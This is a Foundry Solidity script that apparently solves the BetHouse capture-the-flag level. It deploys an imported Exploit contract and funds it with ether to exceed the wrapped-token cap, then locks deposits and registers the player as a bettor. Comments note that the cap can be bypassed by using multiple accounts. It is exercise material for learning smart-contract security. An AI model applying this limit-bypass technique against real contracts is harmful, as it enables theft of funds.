// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {BetHouse, Pool, PoolToken, Exploit} from "src/34.BetHouse.sol";

contract BetHouseScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address instanceAddr = 0xba8192B7865310cd5229DE75BD67d47E91BF30d0;
        address playerAddr = msg.sender;

        console.log("Player Address:", playerAddr);

        BetHouse betHouse = BetHouse(instanceAddr);

        address poolAddr = betHouse.pool();

        console.log("BetHouse Pool:", poolAddr);

        Pool pool = Pool(poolAddr);

        address wrappedTokenAddr = pool.wrappedToken();
        address depositTokenAddr = pool.depositToken();

        console.log("Wrapped Token:", wrappedTokenAddr);
        console.log("Deposit Token:", depositTokenAddr);

        uint256 wrappedTokenBalance = PoolToken(wrappedTokenAddr).balanceOf(playerAddr);
        uint256 depositTokenBalance = PoolToken(depositTokenAddr).balanceOf(playerAddr);

        console.log("Wrapped Token Balance:", wrappedTokenBalance);
        console.log("Deposit Token Balance:", depositTokenBalance); // should be 5

        // To become a bettor, call `makeBet` function
        // we need wrapped token with higher than or equal to BET_PRICE = 20 balance
        // and deposit should be locked

        // 단순히 표면상으로 최대 wrapped token을 15개만 가질 수 있게 되어 있음.
        // 그러나, 여러 계정을 사용해서 해결 가능.

        // Deploy Exploit contract
        Exploit exploit = new Exploit();

        // Exploit
        exploit.exploit{value: 0.002 ether}(poolAddr, playerAddr);

        console.log("Wrapped Token Balance after exploit:", PoolToken(wrappedTokenAddr).balanceOf(playerAddr));

        // Lock deposits
        pool.lockDeposits();

        // Make bet
        betHouse.makeBet(playerAddr);

        console.log("Bettor:", betHouse.isBettor(playerAddr));

        // Total 3 txs...

        vm.stopBroadcast();
    }
}
